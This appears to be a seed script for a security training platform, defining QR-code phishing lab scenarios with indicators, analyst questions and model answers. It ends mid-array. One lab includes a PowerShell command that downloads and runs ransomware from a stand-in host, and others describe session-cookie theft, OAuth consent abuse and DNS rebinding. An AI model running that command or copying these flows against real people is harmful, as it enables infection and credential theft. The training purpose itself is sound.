'use strict';
const path = require('path');
const mongoose = require('mongoose');
require('dotenv').config({ path: path.join(__dirname, '../../..', '.env') });
const Lab = require('../../models/Lab');

// QR Code Attacks – Intermediate: 200 XP | 15 min | 2 hints | Difficulty 3-4/10

const mkLab = (title, difficulty, scenario, artifact, qrPayload, networkSim, indicators, socTasks, hints, answer, explanation) => ({
    title,
    topic: 'qr_phishing',
    level: 'intermediate',
    type: 'qr',
    difficulty,
    points: 200,
    timeLimit: 900,
    published: true,
    description: `Intermediate QR Code attack lab: ${title.replace('QR Phishing - ', '')}. Correlate multi-source indicators and deliver a structured SOC verdict.`,
    scenario,
    content: { artifact, qrPayload, networkSim, indicators, artifacts: [] },
    steps: socTasks,
    hints: hints.map(h => ({ text: h })),
    correctAnswer: answer,
    explanation,
});

const LABS = [
    mkLab(
        'QR Phishing - SEG Bypass via Base64 QR Redirect Chain',
        4,
        'During a threat hunt, the SOC identifies 14 employees who scanned an email-embedded QR code that triggered a two-hop redirect chain. The first hop decoded to a legitimate CDN link that passed reputation checks. The second hop — loaded via JavaScript — delivered a credential harvest page. Email gateway logs show no URL extracted and no alert fired.',
        {
            type: 'email',
            subject: 'Q1 2026 Compliance Training — Mandatory Completion',
            sender: 'compliance-noreply@fintrust-learning[.]com',
            body: 'All employees must complete Q1 compliance training by March 1st.\n\nScan the QR code below to access your training module. Completion is mandatory.\n\n[QR CODE IMAGE]\n\nHR Compliance Team',
            gateway_verdict: 'PASS — no URL detected in email body or attachments',
        },
        {
            decoded: 'https://cdn.legitimate-lms[.]net/redirect?t=base64payload',
            format: 'URL — Base64 encoded redirect parameter',
            hop1: 'cdn.legitimate-lms.net/redirect?t=aHR0cHM6Ly9jcmVkLWhhcnZlc3QtbG1zLmNvbS9sb2dpbg==',
            hop2: 'cred-harvest-lms[.]com/login (decoded from Base64 — loaded via JS fetch())',
            deliveryMethod: 'Email — embedded QR PNG image',
        },
        {
            requests: [
                'GET cdn.legitimate-lms.net/redirect?t=aHR0c... → 302 redirect (CDN passes reputation check)',
                'JS fetch() decodes Base64 parameter → resolves to cred-harvest-lms.com/login',
                'GET cred-harvest-lms.com/login → corporate LMS clone loaded',
                'POST /api/auth → username + password POSTed',
                'Redirect → real LMS (learndash.fintrust.com) — victim unaware',
            ],
            formFields: ['corporate_email', 'password'],
            exfilEndpoint: '/api/auth',
            gatewayEvasion: 'Hop 1 domain has clean reputation — evasion relies on JS-based second hop',
        },
        [
            'Hop 1 domain: cdn.legitimate-lms.net — clean reputation (registered 6 months ago, no threat intel flags)',
            'Hop 2 domain: cred-harvest-lms.com — registered 4 days ago, MX not configured',
            'Email gateway only resolves static URLs — JS-executed redirects invisible to SEG',
            'Base64 decode: aHR0cHM6Ly9jcmVkLWhhcnZlc3QtbG1zLmNvbS9sb2dpbg== → https://cred-harvest-lms.com/login',
            '14 employees submitted credentials — proxy logs show POST /api/auth from 14 corporate IPs',
            'Training urgency + mandatory framing = low suspicion, high compliance rate',
        ],
        [
            'Decode the Base64 string "aHR0cHM6Ly9jcmVkLWhhcnZlc3QtbG1zLmNvbS9sb2dpbg==" and identify the final landing domain. Why is this obfuscation effective against email gateways?',
            'The SEG passed the email because it only resolved Hop 1 (clean CDN). Explain the architectural gap this exploits — and what SEG capability would close it.',
            'Proxy logs show POST /api/auth from 14 corporate IPs to cred-harvest-lms.com. Enumerate the immediate containment steps within the first 30 minutes of discovery.',
            'Correlate the domains: fintrust-learning.com (sender), cdn.legitimate-lms.net (hop 1), cred-harvest-lms.com (hop 2). Build a threat actor infrastructure profile from these three data points.',
        ],
        [
            'Base64 decoded: https://cred-harvest-lms.com/login. SEG effectiveness gap: email gateways perform static URL extraction and reputation checks — they cannot execute JavaScript or follow JS-triggered redirects. Only sandboxed browser-based URL detonation (e.g., Proofpoint TAP, Microsoft Safe Links detonation) follows the full JS redirect chain.',
            '30-minute containment: (1) Block cred-harvest-lms.com at DNS + proxy. (2) Force-reset all 14 compromised accounts + revoke sessions. (3) Block fintrust-learning.com sender at gateway. (4) Search mail logs for all recipients → determine if >14 employees received it. (5) Notify all 14 employees.',
        ],
        'phishing',
        'VERDICT: Multi-Hop QR Credential Phishing — Base64 JS Redirect SEG Evasion. 14 accounts compromised. Risk: CRITICAL.\n\nChain: QR image (bypasses SEG image scan) → CDN redirect with Base64 param (clean rep, passes gateway) → JS decodes → cred-harvest-lms.com (phish page) → POST /api/auth (14 credential sets stolen).\n\nArchitectural Fix: Enable detonation-based URL analysis in SEG + QR image decoding capability. Static URL reputation checking is defeated by JS-redirect chaining.\n\nIOCs: fintrust-learning.com, cdn.legitimate-lms.net, cred-harvest-lms.com, /api/auth endpoint.'
    ),

    mkLab(
        'QR Phishing - Supply Chain Physical Attack (Vendor Invoice)',
        3,
        'FinTrust Corp\'s accounts payable team receives physical invoices from a known vendor. An attacker has intercepted real invoices in transit and placed a QR sticker over the official payment QR. The QR now routes to an attacker-controlled UPI endpoint. Three payments were made before the discrepancy was identified during bank reconciliation.',
        {
            type: 'physical_invoice',
            origin: 'Intercepted vendor mail — TrustedPrint Ltd. invoices for Q1 2026',
            tamper: 'QR sticker placed over original "Pay via QR" section — visually identical to authentic layout',
            amount: '₹1,84,500 total across 3 invoices (₹61,500 each)',
            discovery: 'Bank reconciliation showed payments to unknown UPI ID — TrustedPrint Ltd. never received funds',
        },
        {
            decoded: 'upi://pay?pa=billing-fastpay@paytm&pn=TrustedPrint+Ltd&am=61500&cu=INR',
            format: 'UPI Payment URI',
            legitimateUPI: 'trustedprint@icici (real vendor UPI — confirmed by vendor)',
            attackerUPI: 'billing-fastpay@paytm — attacker-controlled mule account',
            deliveryMethod: 'Physical invoice mail — QR sticker overlay on printed document',
        },
        {
            payments: [
                'Payment 1: ₹61,500 → billing-fastpay@paytm at 11:23 AM (Jan 31)',
                'Payment 2: ₹61,500 → billing-fastpay@paytm at 02:47 PM (Feb 14)',
                'Payment 3: ₹61,500 → billing-fastpay@paytm at 10:15 AM (Feb 21)',
            ],
            muleActivity: 'Funds transferred from billing-fastpay@paytm to 3 secondary accounts within 30 min of each payment',
            totalLoss: '₹1,84,500',
            discoveryMethod: 'Monthly reconciliation — TrustedPrint Ltd. sent payment reminder for "overdue" invoices',
        },
        [
            'UPI display name: "TrustedPrint Ltd." — display name matches vendor, but VPA does not (billing-fastpay@paytm vs trustedprint@icici)',
            'Physical invoice tampering — QR sticker placed post-print, pre-delivery',
            '3 payments across 3 weeks — attacker waited between payments to avoid immediate detection',
            'Funds layered within 30 minutes of receipt — rapid-exit mule network',
            'No out-of-band payment verification performed — single-channel confirmation',
            'Invoice paper stock + font consistent — only QR section tampered',
        ],
        [
            'The UPI display name says "TrustedPrint Ltd." but the VPA (UPI ID) is billing-fastpay@paytm. In UPI payment flows, which field is the actual routing identifier — and how should Accounts Payable verify it?',
            'The attacker waited 2–3 weeks between each payment. What does this paced attack cadence indicate about attacker patience and detection-avoidance strategy?',
            'The physical invoice was intercepted between vendor and FinTrust. What physical access or mail interception technique enabled this attack, and what supply chain control prevents it?',
            'Design a dual-control payment verification procedure that would have prevented all 3 fraudulent payments.',
        ],
        [
            'VPA (Virtual Payment Address) is the true routing identifier in UPI — the display name can be freely set to anything. Accounts Payable must always compare the VPA character-by-character against the vendor\'s on-file UPI ID (maintained in vendor master records), not the display name.',
            'Dual-control procedure: (1) Any payment >₹25,000 requires verification call to vendor\'s published helpline. (2) Two-person authorization — AP clerk initiates, AP manager verifies vendor UPI ID against master before approval. (3) UPI ID changes require vendor portal update + email confirmation from vendor\'s domain.',
        ],
        'phishing',
        'VERDICT: Supply Chain Physical Invoice Attack — UPI Payment Redirection. ₹1,84,500 loss. 3 fraudulent payments.\n\nAttack Surface: Physical mail supply chain — invoices tampered in transit between print and delivery.\n\nKey Failure: UPI display name trusted over VPA. Zero out-of-band verification. Single-channel payment approval.\n\nRecovery: File NPCI dispute + Cybercrime.gov.in complaint. Vendor to send fresh invoices via authenticated email (PGP-signed). Implement dual-control for all payments >₹25,000.'
    ),

    mkLab(
        'QR Phishing - AiTM via QR in Physical Conference Badge',
        4,
        'At an industry security conference, a threat actor distributed unofficial lanyards with QR codes printed on the badge back. The badges were placed on unattended registration tables. The QR claimed to link to the conference Wi-Fi login — but launched an Evilginx3 proxy targeting Microsoft 365 credentials of attendees.',
        {
            type: 'physical_conference_badge',
            location: 'Security conference — registration desk (unattended during lunch)',
            badge_text: 'CONFERENCE ATTENDEE\nScan for Secure WiFi Access\n[QR CODE]',
            tamper: 'Fake badges placed alongside real badges on registration table',
            target_audience: 'Security professionals — high-value credential targets',
        },
        {
            decoded: 'https://conf-wifi-access[.]net/connect',
            format: 'URL',
            actualBehavior: 'AiTM proxy (Evilginx3) — real-time Microsoft 365 credential relay',
            deliveryMethod: 'Physical badge — conference registration table',
        },
        {
            aitmFlow: [
                'GET /connect → Microsoft 365 login proxy (Evilginx3 phishlet)',
                'Page looks identical to login.microsoftonline.com — IS the real page, proxied',
                'Username → relayed live to Microsoft',
                'Password → relayed live',
                'MFA OTP (Authenticator push) → victim approves → relayed live',
                'Session cookie captured — full Microsoft 365 access granted to attacker',
                'Victim redirected to real conference Wi-Fi portal — unaware',
            ],
            sessionCookies: '23 Microsoft 365 session cookies captured across conference day',
            aitmTool: 'Evilginx3 with Microsoft 365 phishlet',
            serverLocation: 'VPS — Frankfurt (Hetzner AS24940)',
        },
        [
            'Domain: conf-wifi-access.net — registered 3 days before conference',
            'TLS: Valid certificate — "conf-wifi-access.net" — not Microsoft domain',
            '23 session cookies captured — high-value targets (security professionals)',
            'AiTM bypasses standard OTP MFA — session token stolen post-authentication',
            'Victims redirected to real conference Wi-Fi portal — no suspicion aroused',
            'Conference organizers had no official QR code for Wi-Fi — distributed credentials verbally/on screen',
        ],
        [
            'This attack targeted SECURITY PROFESSIONALS at a security conference. What does this tell you about attacker risk tolerance and the value of compromising security personnel credentials specifically?',
            'Standard OTP-based MFA was bypassed because the AiTM relays the OTP and steals the session cookie AFTER authentication succeeds. Explain the difference between what TOTP protects against versus what it cannot protect against.',
            'The URL bar showed "conf-wifi-access.net" — NOT "login.microsoftonline.com." 23 security professionals missed this. What human factor explains this miss even among trained security staff?',
            'What is the ONLY MFA method that is cryptographically resistant to AiTM proxy attacks, and why does it succeed where TOTP fails?',
        ],
        [
            'Security professionals hold credentials with access to threat intel, incident response tools, customer data, and internal security architecture. Compromising a CISO\'s M365 session at a conference gives an attacker access to organizational security posture data — extremely high-value target.\n\nTOTP protects against: Credential stuffing/replay attacks (password stolen separately). TOTP cannot protect against: AiTM — because the OTP is valid for 30 seconds, and the AiTM relays it within milliseconds. The session token issued AFTER MFA succeeds is the stolen artifact.',
            'FIDO2/WebAuthn (Passkeys/Hardware Security Keys) — origin binding. The FIDO2 credential is cryptographically bound to the ORIGIN (login.microsoftonline.com). When an AiTM proxy serves the login page from conf-wifi-access.net, the browser sees the origin mismatch and refuses to release the FIDO2 credential. The authentication fails on the phish site — protecting the account regardless of proxy.',
        ],
        'phishing',
        'VERDICT: AiTM QR Attack at Security Conference — 23 Microsoft 365 Session Cookies Stolen. Risk: CRITICAL.\n\nIrony: Security professionals targeted at a security conference — demonstrating that awareness alone is insufficient without phishing-resistant MFA.\n\nFIPS 140-3 Recommendation: Mandate FIDO2 hardware keys (YubiKey) for all security team Microsoft 365 accounts — the ONLY control that would have protected all 23 victims.\n\nNotification: All 23 Session cookies must be revoked immediately. Alert conference organizers. File law enforcement report.'
    ),

    mkLab(
        'QR Phishing - Malicious Google Workspace OAuth QR',
        3,
        'Employees in the marketing department receive a Slack message from an attacker who has already compromised a junior employee\'s account. The message links to a QR code that, when scanned, initiates a malicious Google OAuth consent flow requesting access to Gmail, Drive, and Contacts with broad permissions.',
        {
            type: 'slack_internal_message',
            sender: 'Compromised account: priya.sharma@fintrust.com (junior marketing)',
            message: 'Hey team, we\'re migrating our email archive tool. Scan the QR to authorize the new app — takes 30 seconds. IT asked us to complete by EOD.',
            platform: 'Slack DM to marketing team channel (12 recipients)',
        },
        {
            decoded: 'https://accounts.google.com/o/oauth2/auth?client_id=ATTACKER_CLIENT_ID&scope=https://mail.google.com/+https://www.googleapis.com/auth/drive+https://www.googleapis.com/auth/contacts&redirect_uri=https://gworkspace-migration[.]app/callback',
            format: 'Google OAuth Authorization URL',
            deliveryMethod: 'Internal Slack message — compromised account (trusted sender)',
            legitimateOrigin: 'URL starts with accounts.google.com — URL is real Google OAuth URL',
        },
        {
            oauthFlow: [
                'GET accounts.google.com/o/oauth2/auth?client_id=ATTACKER_CLIENT&scope=... → Real Google OAuth page',
                'Employee sees: "gworkspace-migration.app wants to access your Google Account"',
                'Scopes requested: Read all email, Read + Write Google Drive, Access Contacts',
                'Employee clicks "Allow" — OAuth token issued to gworkspace-migration.app',
                'Attacker uses token to: read all email, exfiltrate Drive files, harvest contacts',
            ],
            tokenPersistence: 'OAuth token valid indefinitely until revoked — no password needed',
            grantedCapability: 'Full Gmail read access + Drive read/write + Contacts export',
            clientId: 'ATTACKER_CLIENT_ID registered as Google Cloud project "Workspace Migration Tool"',
        },
        [
            'OAuth URL is legitimate accounts.google.com — scam is in the app permissions, not URL',
            'Scope: mail.google.com (ALL email) + drive (ALL files) + contacts (ALL contacts) — broad, aggressive',
            'App name: "Workspace Migration Tool" — plausible for an IT migration request',
            'Message source: compromised internal Slack account — trusted sender increases compliance',
            'Token is persistent — no password required, access continues until token revoked',
            'Redirect URI: gworkspace-migration.app — attacker-controlled OAuth callback endpoint',
        ],
        [
            'The OAuth URL is a genuine Google URL (accounts.google.com) — this is not a fake page. Explain how the attack succeeds despite the URL being 100% legitimate Google infrastructure.',
            'The OAuth scopes requested are: gmail read-all, drive read/write, contacts. Translate these permissions into concrete attacker capabilities — what can they do with this access?',
            'The message came from a verified internal Slack account (priya.sharma@fintrust.com). How does social trust from a legitimate internal sender bypass standard phishing awareness training?',
            'A security-aware employee opens the OAuth consent screen. What three specific things on the consent screen should stop them from clicking "Allow"?',
        ],
        [
            'Malicious OAuth succeeds on legitimate Google infrastructure — there is no phishing page to detect. The attack exploits the OAuth consent mechanism itself. Google only verifies the client_id is registered — not whether the app is legitimate or trustworthy. The attacker registered "Workspace Migration Tool" as a real Google Cloud app → OAuth consent is real → token is real → all access is legitimate (from Google\'s perspective).',
            'Three consent screen red flags: (1) App name "gworkspace-migration.app" — not an official Google or FinTrust app. (2) Scopes: "Read, compose, send, delete all email" + "See, edit, create, delete all Drive files" — no legitimate migration tool needs WRITE + DELETE access. (3) App is unverified (Google shows warning banner: "This app isn\'t verified") — only published, Google-reviewed apps lack this warning.',
        ],
        'phishing',
        'VERDICT: Malicious Google OAuth QR — Persistent Email + Drive + Contacts Access via Consent Phishing. Risk: CRITICAL.\n\nNo phishing page. The victim authorized the attacker\'s Google Cloud app via legitimate Google OAuth. Token grants indefinite read/write access until explicitly revoked.\n\nCapabilities: Read all email (credential resets, business intel), exfiltrate all Drive files (IP theft), harvest contacts (spear phishing expansion).\n\nRemediation: accounts.google.com/permissions → Revoke "Workspace Migration Tool" immediately for all 12 recipients. Investigate source account compromise (priya.sharma). File Google abuse report for ATTACKER_CLIENT_ID.'
    ),

    mkLab(
        'QR Phishing - Ransomware Delivery via QR-Linked Macro Document',
        4,
        'A QR code in a printed brochure at a trade show links to a "product datasheet" download. The downloaded DOCX requires macros to "display correctly." Enabling macros executes a PowerShell payload that downloads Ryuk-variant ransomware. Three workstations at FinTrust were infected before the EDR quarantined the process chain.',
        {
            type: 'physical_brochure',
            location: 'Industry trade show — booth of fake company "DataEdge Solutions"',
            brochure_text: 'Download our full product datasheet for technical specifications.\n[QR CODE]\nScan for instant PDF access.',
            targetProfile: 'IT procurement and technology evaluation staff',
        },
        {
            decoded: 'https://dataedge-solutions[.]com/resources/datasheet-2026.docx',
            format: 'URL — direct DOCX download',
            deliveryMethod: 'Physical brochure — trade show booth',
            fileType: 'DOCX (Word document with embedded VBA macro)',
        },
        {
            macroPayload: 'VBA macro executes on Open → spawns cmd.exe → PowerShell one-liner',
            powershell: 'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -c "(New-Object Net.WebClient).DownloadFile(\'http://payload-drop[.]ru/ryuk.exe\',\'$env:TEMP\\\\svchost32.exe\');Start-Process \'$env:TEMP\\\\svchost32.exe\'"',
            ransomware: 'Ryuk variant — encrypts all network shares + local drives — demands 0.5 BTC',
            edrAction: 'Quarantined PowerShell child process after 3 workstations infected — C:/Users path encrypted',
            c2: 'http://payload-drop[.]ru — Russian TLD bulletproof hosting',
        },
        [
            'DOCX with VBA macro — "Enable Content" prompt is a known malware delivery vector',
            'PowerShell: -ExecutionPolicy Bypass + -WindowStyle Hidden — deliberate evasion flags',
            'C2 payload download: payload-drop.ru — Russian domain, bulletproof host',
            'svchost32.exe written to %TEMP% — process masquerades as legitimate Windows service name',
            'EDR alert: suspicious parent-child process: WINWORD.EXE → cmd.exe → powershell.exe',
            '3 workstations encrypted before EDR quarantine — damage occurred before detection',
        ],
        [
            'The macro executes "powershell -ExecutionPolicy Bypass -WindowStyle Hidden." Decode what each flag does and explain why this specific combination is a reliable malware execution indicator for EDR rules.',
            'The ransomware binary is named "svchost32.exe" dropped in %TEMP%. What LOLBIN/masquerading technique does this represent, and how does a host-based IOC rule catch it?',
            'EDR quarantined after 3 workstations were infected. The process chain was WINWORD.EXE → cmd.exe → powershell.exe. Why is this parent-child execution chain an effective EDR detection rule?',
            'Write a 5-step incident response playbook for ransomware containment starting from the moment the EDR alert fires.',
        ],
        [
            '-ExecutionPolicy Bypass: Overrides PowerShell\'s script execution policy — allows unsigned scripts. -WindowStyle Hidden: No PowerShell console window visible to user — hidden execution.\n\nEDR Detection Rule: Flag any process where parent = WINWORD.EXE AND child = cmd.exe OR powershell.exe. Word spawning command interpreters = 99%+ malware activity. Legitimate macros (data refresh, mail merge) do not require cmd.exe/PowerShell.',
            '5-Step Ransomware IR:\n1. (T+0) Isolate: Disconnect all 3 infected workstations from network (pull cable, disable WiFi).\n2. (T+5) Scope: EDR → identify all systems with WINWORD.EXE process tree. Check network shares for encrypted files.\n3. (T+15) Contain: Block payload-drop.ru at DNS/firewall. Block DOCX download domain.\n4. (T+30) Preserve: Forensic image of infected workstations before remediation.\n5. (T+60) Recover: Restore from last clean backup. Validate backup integrity before restore.',
        ],
        'phishing',
        'VERDICT: QR-Delivered Ransomware — Macro Document + PowerShell Downloader + Ryuk Variant. 3 workstations encrypted.\n\nChain: Physical brochure QR → DOCX download → VBA macro → PowerShell bypasses controls → Ryuk payload → file encryption.\n\nCost: 3 workstations encrypted. Incident response + backup restoration. Potential BTC ransom demand: 0.5 BTC.\n\nPolicy Fix: Block macros via Group Policy (Disable macros for documents from internet). Enable ASR rules (Attack Surface Reduction) in Defender for Endpoint.'
    ),

    mkLab(
        'QR Phishing - LinkedIn QR Code Profile Spear Attack',
        3,
        'A senior FinTrust Corp executive receives a LinkedIn connection request from a fake recruiter. After connecting, the recruiter sends a message with a QR code: "Scan to access your confidential compensation benchmarking report." The QR leads to a spear-phishing credential page pre-filled with the executive\'s corporate email.',
        {
            type: 'linkedin_direct_message',
            sender: 'Fake recruiter: "Ananya Sharma — Senior Talent Partner, FinTrust Consulting" (fake company)',
            connection: 'Connected 3 days before message — profile: 387 connections, professional headshot (AI-generated)',
            message: 'Hi [Name], based on your profile I\'ve prepared a confidential salary benchmarking report for your role level. Scan the QR to access your personalized report — takes 30 seconds.',
            personalisation: 'Executive\'s name, job title, reported salary range all referenced correctly — from LinkedIn public data + prior data breach',
        },
        {
            decoded: 'https://fintrust-compensation-report[.]com/access?email=exec.name@fintrust.com',
            format: 'URL — pre-seeded with victim email as URL parameter',
            deliveryMethod: 'LinkedIn DM — QR image attached',
            osint_used: 'LinkedIn public profile + data breach (email from leaked dataset)',
        },
        {
            pageFlow: [
                'GET /access?email=exec.name@fintrust.com → page pre-fills "Welcome, [Name]" with exec\'s first name',
                'Email field pre-filled: exec.name@fintrust.com — victim assumes authenticated session',
                'Password field only: "Enter your FinTrust password to access compensation report"',
                'POST /fetch-report → password exfiltrated',
                'Redirect: "Your report is being generated. Check email." — no report delivered',
            ],
            formFields: ['pre-filled email (readonly)', 'password'],
            osintLevel: 'Name, title, approximate salary, corporate email — all obtained from LinkedIn + breach data',
        },
        [
            'Pre-filled email creates assumption of authenticated session — reduces friction and suspicion',
            'LinkedIn DM from a plausible recruiter — social trust via professional network',
            'Personalization: exec\'s name + company-specific report framing = highly targeted spear attack',
            'Domain: fintrust-compensation-report.com — 7 days old, not fintrust.com',
            'AI-generated profile photo — detectable via FaceCheck.ID or Google Lens reverse image search',
            'Salary data likely from prior HR data breach or LinkedIn Salary data scraping',
        ],
        [
            'The page pre-fills the victim\'s email from the URL parameter (?email=). Why does pre-filling personal details increase victim compliance, and what does this tactic signal about the attacker\'s OSINT investment?',
            'The recruiter profile had 387 connections and a professional headshot. How would you technically verify this LinkedIn profile is fake using freely available tools?',
            'This is a spear-phishing (targeted) attack vs. mass-phishing. List 3 specific indicators that confirm this was a targeted operation rather than a generic campaign.',
            'What corporate policy or technical control prevents targeted social media-based QR attacks against executives?',
        ],
        [
            'Pre-filled data = attacker invested time in OSINT → victim assumes the site "already knows them" → lower suspicion, higher compliance. This is the psychological principle of familiarity and authority cues. It signals: attacker accessed LinkedIn profile data, corporate email from breach database, possibly previous conversations or HR system data.\n\nFake profile detection tools: (1) FaceCheck.ID — reverse image search for AI-generated faces. (2) LinkedIn profile age check (join date visible on full profile). (3) Endorsements from other profiles — fake recruiters have generic endorsements from other fake accounts.',
            '3 Spear-phishing Indicators: (1) Victim name + email pre-populated in URL parameter — generic campaigns use blank forms. (2) Compensation report specifically tailored to exec\'s seniority — not generic "Win prize" lure. (3) LinkedIn connection established 3 days before DM — attacker built rapport before attacking. Generic campaigns don\'t invest in relationship building.',
        ],
        'phishing',
        'VERDICT: LinkedIn Spear-Phishing QR — OSINT-Personalized Executive Credential Harvest. Risk: HIGH.\n\nOSINT Used: LinkedIn public data + breach dataset → enabled name/email pre-fill, salary-aware luring.\n\nRemediation: Reset exec\'s corporate password. Enforce MFA. Brief exec on recruiter-based social engineering. Policy: Executives must not connect with unknown recruiters on LinkedIn using corporate email.'
    ),

    mkLab(
        'QR Phishing - DNS Rebinding via QR WiFi Attack',
        4,
        'A QR code in a co-working space connects users to a WiFi network that appears normal. After 5 minutes of browsing, a DNS rebinding attack pivots the attacker\'s JavaScript from an external server to the victim\'s internal 192.168.x.x network — harvesting credentials from the corporate VPN client admin panel accessible on localhost.',
        {
            type: 'physical_sticker',
            location: 'Co-working space — networking area near hotdesk stations',
            text: 'MEMBER WIFI — PREMIUM SPEED\nScan to connect.\nManaged by SpaceNet Pro.',
            speed_claim: '200 Mbps symmetric — convincing for co-working context',
        },
        {
            decoded: 'WIFI:T:WPA;S:SpaceNet_Premium;P:cowork2026;;',
            format: 'WiFi Config',
            secondaryBehavior: 'DNS rebinding attack launched after 5-minute delay',
            deliveryMethod: 'Physical sticker — co-working networking area',
        },
        {
            attackFlow: [
                'Phase 1: Device connects to SpaceNet_Premium rogue AP — normal browsing works (traffic forwarded)',
                'Phase 2: dns-rebind[.]io resolves to attacker IP initially — serves malicious JS page',
                'Phase 3 (T+5 min): DNS TTL expires → dns-rebind.io now resolves to 192.168.1.1 (victim\'s gateway)',
                'Phase 4: Browser\'s SOP (Same-Origin Policy) now treats dns-rebind.io as same-origin as 192.168.1.1',
                'Phase 5: JS fetches http://192.168.1.1/index.htm — VPN admin panel harvested',
                'Phase 6: Credentials from admin panel POSTed to attacker external C2',
            ],
            targetedPorts: '192.168.1.1:80 (gateway), localhost:8080 (dev server), 192.168.x.x:8443 (VPN panel)',
            browserSameOriginBypass: 'DNS rebinding fools browser SOP by changing IP mid-session while hostname stays same',
        },
        [
            'DNS rebinding bypasses browser Same-Origin Policy — most users and analysts unfamiliar with this attack',
            'Rogue AP forwards real internet traffic during Phase 1 — victim experiences normal browsing (no suspicion)',
            'Attack targets internal resources inaccessible from internet — internal admin panels, dev servers',
            'Short DNS TTL (1s) enables rapid rebinding — rebinding window controlled by attacker',
            'VPN client admin panels on localhost frequently have default credentials or no authentication',
            'No malware installed — pure network + browser attack',
        ],
        [
            'Explain DNS rebinding in plain terms: why does the browser\'s Same-Origin Policy fail to protect internal resources after the DNS rebind occurs?',
            'The attack waits 5 minutes before rebinding. Why does the delay increase operational success, and what technique would detect the rebinding event in DNS logs?',
            'The targeted resource is http://192.168.1.1 — the internal gateway/VPN admin panel. What makes internal web panels particularly vulnerable to DNS rebinding attacks?',
            'What two browser security controls or network configurations would prevent this DNS rebinding attack?',
        ],
        [
            'DNS Rebinding SOP bypass: Browser enforces SOP based on hostname + port (not IP). In Phase 1, dns-rebind.io resolves to attacker\'s IP — browser loads attacker\'s page. In Phase 3, DNS TTL expires and attacker\'s DNS server now returns 192.168.1.1 for the same hostname. Browser thinks "same hostname = same origin" → allows the previously loaded JS to now make requests to 192.168.1.1. SOP is tricked because it checks hostname, not underlying IP.\n\nPrevention: (1) Private IP DNS rebinding protection in modern browsers (Chrome 98+: Private Network Access header required). (2) VPN admin panels should require authentication + bind to localhost only + use HTTPS with a valid cert.',
        ],
        'phishing',
        'VERDICT: Advanced QR WiFi Attack — DNS Rebinding via Rogue AP → Internal Network Access. Risk: HIGH.\n\nNo malware. No credential page visited. Browser SOP bypassed via DNS TTL manipulation → internal VPN admin panel harvested.\n\nUnique Risk: Victim experiences normal internet — no suspicious behavior. Attack is entirely invisible to standard phishing awareness.\n\nDefense: Enable Chrome\'s Private Network Access protection. VPN panels: HTTPS only + strong auth. Network: Split DNS — internal zones must not resolve on guest WiFi.'
    ),

    mkLab(
        'QR Phishing - Watering Hole via Printed Magazine QR',
        3,
        'A security researcher discovers that a QR code in a printed cybersecurity trade magazine links to an article page that has been compromised. The legitimate article page now serves a browser exploit (CVE-targeted) to readers running unpatched Chrome on Windows — a classic watering hole attack initiated via physical QR distribution.',
        {
            type: 'print_magazine',
            publication: 'CyberDefense Quarterly — Q1 2026 Issue',
            article: 'QR code labeled: "Scan to read the full research report: Threat Actor TTP Analysis 2026"',
            distributedTo: 'Security professionals, IT managers — approximately 12,000 print copies',
            compromisedAt: 'Publisher\'s CMS hacked 3 weeks before magazine went to print',
        },
        {
            decoded: 'https://cyberdefense-quarterly[.]com/research/ttp-analysis-2026',
            format: 'URL',
            legitimateSite: 'Article URL is real — site had been compromised',
            deliveryMethod: 'Printed trade magazine — QR in article sidebar',
        },
        {
            injectedPayload: 'Malicious JS injected into article page via CMS compromise',
            exploit: 'CVE-2025-XXXX — Chrome V8 engine JIT compiler UAF (use-after-free)',
            targetedVersions: 'Chrome < 121.0.6167.160 — unpatched installations',
            shellcode: 'Dropped payload: reverse shell → exfiltrates browser-saved credentials + cookies',
            detectionRate: '2/68 on VirusTotal at time of discovery — heavily obfuscated JS',
            durationActive: 'Exploit served for 19 days before removal',
        },
        [
            'Physical QR distribution cannot be recalled — 12,000 magazines already in circulation after compromise discovery',
            'CVE targets unpatched Chrome — patch cadence is critical defense',
            'High-value target profile: security pros + IT managers = credential rich targets',
            'VirusTotal detection: 2/68 — novel/obfuscated exploit bypassed most AV engines',
            'Watering hole: attacker compromised a trusted site rather than creating a fake one',
            'Browser-saved credential exfiltration — no user interaction after page load',
        ],
        [
            'What distinguishes a watering hole attack from a spear-phishing attack — and why does compromising a trusted site make the QR delivery mechanism highly effective against security-aware targets?',
            'The exploit targets CVE-2025-XXXX in Chrome < 121.0. A victim running Chrome 120 visits the page. What happens, and what single patch would have prevented code execution?',
            'Physical QR distribution creates an "irrevocable delivery" problem. Explain why this fundamentally changes the publisher\'s incident response options compared to a phishing email campaign.',
            'The injected JS had a 2/68 VirusTotal detection rate. What obfuscation techniques did the attacker likely use, and what detection method is most effective against heavily obfuscated JS?',
        ],
        [
            'Watering hole vs. spear phishing: Spear phishing sends lure to target. Watering hole compromises a site the target ALREADY TRUSTS and visits legitimately. Security-aware users are trained to be suspicious of emails — they are NOT trained to distrust trusted publications they read regularly. The QR in a magazine read by security professionals used this trust explicitly.\n\nPhysical irrevocability: Phishing emails can be recalled or quarantined via email gateway. Printed magazines cannot be recalled once distributed. The publisher can only: (1) Issue a press advisory, (2) Update the article URL to redirect to a safe page, (3) Remove the CMS-injected payload.',
        ],
        'phishing',
        'VERDICT: Watering Hole Attack via Compromised Publisher CMS — QR-Initiated Browser Exploit Delivery. Chrome UAF RCE. Risk: CRITICAL.\n\nScope: 12,000+ printed QRs active. Exploit served for 19 days. Target: security professionals — highest-value credentials.\n\nRemediation: Immediate CMS audit + clean. Update Chrome on all enterprise endpoints. Deploy browser exploit protection (CrowdStrike Falcon for browsers, Bromium). Alert magazine subscribers via email.'
    ),

    mkLab(
        'QR Phishing - Vishing + QR Combination Attack',
        3,
        'A FinTrust Corp employee receives a phone call from someone claiming to be IT support. The caller says their email account shows suspicious activity and instructs them to scan a QR code sent via SMS to "verify their identity." The QR leads to a fake account verification portal.',
        {
            type: 'combined_vishing_smishing_qr',
            channel1: 'Inbound phone call — caller ID spoofed as internal IT Helpdesk: +91-44-XXXX (FinTrust IT number)',
            channel2: 'SMS sent during call: "FinTrust IT: Scan QR to verify your account: [image link to QR]"',
            caller_script: '"We\'ve detected suspicious login activity on your account from Bucharest. I\'m sending you a QR code right now — scan it to verify your identity and we\'ll lock out the attacker."',
            social_engineering: 'Urgency + fear (account compromise) + authority (IT helpdesk number)',
        },
        {
            decoded: 'https://fintrust-account-verify[.]com/identity',
            format: 'URL',
            deliveryMethod: 'SMS link during live vishing call — QR image served at SMS URL',
        },
        {
            pageFlow: [
                'GET /identity → "FinTrust Account Verification — IT Security Response"',
